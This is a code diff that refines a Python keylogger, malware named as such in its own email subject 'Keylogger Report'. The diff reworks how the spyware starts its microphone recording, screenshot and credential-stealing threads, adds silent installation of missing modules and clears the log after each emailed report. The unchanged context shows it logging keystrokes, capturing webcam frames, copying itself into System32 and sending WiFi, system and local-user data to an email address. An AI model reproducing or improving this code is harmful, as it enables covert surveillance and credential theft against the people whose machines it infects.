@@ -28,9 +28,22 @@ try:
     from email import encoders
 
 except ModuleNotFoundError:
+    from subprocess import run
+    missing_modules = []
+
+    def check_module(module_name):
+        try:
+            __import__(module_name)
+        except ModuleNotFoundError:
+            missing_modules.append(module_name)
+
     modules = ["opencv-python", "wmi", "pywin32", "requests", "pyscreenshot", "sounddevice", "soundfile", "pynput"]
+
     for module in modules:
-        subprocess.run(["pip", "install", module])
+        check_module(module)
+
+    if missing_modules:
+        run(["pip", "install"] + missing_modules)
 
 finally:
     temp_dir = "temp"
@@ -91,6 +104,7 @@ finally:
                     if current_key == ' ':
                         current_key = ' '
                     self.appendlog(current_key)
+
                 except AttributeError:
                     if key == keyboard.Key.space:
                         self.appendlog(' ')
@@ -136,23 +150,25 @@ finally:
 
                 try:
                     AudioSegment.from_wav(audio_path)
-                    self.appendlog("Audio recorded successfully.\n\n")
+                    self.appendlog("Audio recorded successfully.\n")
 
                 except Exception as play_error:
-                    self.appendlog(f"An error occurred while trying to play the recorded audio: {str(play_error)}\n\n")
+                    self.appendlog(f"An error occurred while trying to play the recorded audio: {str(play_error)}\n")
 
             except Exception as e:
-                self.appendlog(f"An error occurred while recording audio: {str(e)}\n\n")
+                self.appendlog(f"An error occurred while recording audio: {str(e)}\n")
 
         def screenshot(self):
             try:
                 img = pyscreenshot.grab()
                 img_path = os.path.join(temp_dir, "screenshot.png")
                 img.save(img_path)
+
                 if os.path.isfile(img_path):
                     self.appendlog("Screenshot saved successfully.\n")
                 else:
                     self.appendlog("Screenshot was not saved successfully.\n")
+
             except Exception as e:
                 self.appendlog(f"An error occurred while taking a screenshot: {str(e)}\n")
 
@@ -189,17 +205,17 @@ finally:
             cap = cv2.VideoCapture(0)
 
             if not cap.isOpened():
-                self.appendlog("Camera failed to open...\n\n")
+                self.appendlog("Camera failed to open...\n")
                 return
 
             ret, frame = cap.read()
 
             if not ret:
-                self.appendlog("Frame could not be captured.\n\n")
+                self.appendlog("Frame could not be captured.\n")
                 return
 
             if cap.isOpened():
-                self.appendlog("Frame saved successfully.\n\n")
+                self.appendlog("Frame saved successfully.\n")
 
                 frame_path = os.path.join(temp_dir, "captured_frame.jpg")
                 cv2.imwrite(frame_path, frame)
@@ -406,9 +422,7 @@ finally:
         def run(self):
             microphone_thread = threading.Thread(target = self.microphone)
             screenshot_thread = threading.Thread(target = self.screenshot)
-
             credentials_thread = threading.Thread(target = self.get_and_send_credentials)
-
             local_users_thread = threading.Thread(target = self.get_and_send_local_users_info)
 
             mouse_listener = MouseListener(on_move = self.onMove, on_click = self.onClick, on_scroll = self.onScroll)
@@ -421,7 +435,10 @@ finally:
             self.appendlog('\n')
             self.copy_to_system32()
             credentials_thread.start()
+            microphone_thread.start()
+            screenshot_thread.start()
             self.take_photo()
+            self.appendlog('\n')
             self.appendlog("WiFi Information On The Target System:\n\n")
             self.appendlog(wifi_info_string)
             self.appendlog('\n')
@@ -431,13 +448,9 @@ finally:
             self.appendlog('\n')
             self.get_systeminfo()
             local_users_thread.start()
-
             self.appendlog('\n\n')
 
             with keyboard_listener, mouse_listener:
-                microphone_thread.start()
-                screenshot_thread.start()
-
                 microphone_thread.join()
                 screenshot_thread.join()
                 credentials_thread.join()
@@ -461,11 +474,10 @@ finally:
                 keyboard_listener = keyboard.Listener(on_press = self.onPress)
 
                 self.take_photo()
+                microphone_thread.start()
+                screenshot_thread.start()
 
                 with keyboard_listener, mouse_listener:
-                    microphone_thread.start()
-                    screenshot_thread.start()
-
                     microphone_thread.join()
                     screenshot_thread.join()
 
@@ -475,8 +487,9 @@ finally:
                         os.path.join(temp_dir, "captured_frame.jpg"),
                     ]
                     self.send_mail("Keylogger Report", self.log, attachment_paths)
-
                     time.sleep(SEND_REPORT_EVERY)
+
+                self.clear_log()
 
     if __name__ == "__main__":
         keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
